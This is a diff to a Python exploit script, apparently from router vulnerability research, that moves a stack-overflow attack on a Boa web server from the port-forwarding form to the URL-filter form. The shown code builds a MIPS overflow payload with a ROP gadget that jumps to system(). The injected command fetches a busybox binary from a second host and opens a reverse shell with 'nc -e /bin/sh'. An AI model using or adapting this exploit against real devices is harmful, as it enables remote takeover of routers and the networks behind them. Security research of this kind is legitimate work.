@@ -10,6 +10,7 @@ from selenium.webdriver.chrome.options import Options
 from webdriver_manager.chrome import ChromeDriverManager
 
 
+# sessionId
 sessionId = ""
 
 def getSessionId():
@@ -47,22 +48,26 @@ def attack():
     
     cmd = b' sleep 5; wget http://192.168.0.2:8000/busybox-mipsel;chmod 777 ./busybox-mipsel;./busybox-mipsel nc 192.168.0.2 2333 -e /bin/sh;'
    
-    payload_body = f'sessionCheck={sessionId}&changlist=0&service_type=FTP&external_port=24&internal_port=21&ip_subnet=192.168.0.&fw_ip='.encode()
+    payload_body = f'sessionCheck={sessionId}&enabled=1&urlFilterMode=0&urlFilterBlack=blackList&url='.encode()
        
-    payload_body += b'a'*(0x5c-10) # buf
+    payload_body += b'a'*0xb8 # buf
     payload_body += p32(0xaaaaaaaa) # s0 dummy
     payload_body += p32(libc_base + 0x00033448)  # s1 (system() address)
     payload_body += p32(0x22222222) # s2 dummy
     payload_body += p32(0x33333333) # s3 dummy
     payload_body += p32(0x44444444) # s4 dummy    
+    payload_body += p32(0x55555555) # s5 dummy
+    payload_body += p32(0x66666666) # s6 dummy
+    payload_body += p32(0x77777777) # s7 dummy
+    payload_body += p32(0x88888888) # fp dummy
     payload_body += p32(libc_base + 0x000378d4)  # ra (ROP gadget)
     payload_body += b'b' * (0x120)  # padding
     payload_body += cmd  # Reverse Shell
-    payload_body += b'&protocol=1&addPortFw=Apply&submit-url=%2Fportfw.htm'
+    payload_body += b'&save_apply=Apply&addFilterUrlFlag=1&submit-url=%2Furlfilter.htm'
     
     content_length = len(payload_body)
     
-    payload = b"POST /boafrm/formPortFw HTTP/1.1\r\n"
+    payload = b"POST /boafrm/formFilter HTTP/1.1\r\n"
     payload += b'Host: 192.168.0.1\r\n'
     payload += b'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\r\n'
     payload += b'Accept: */*\r\n'
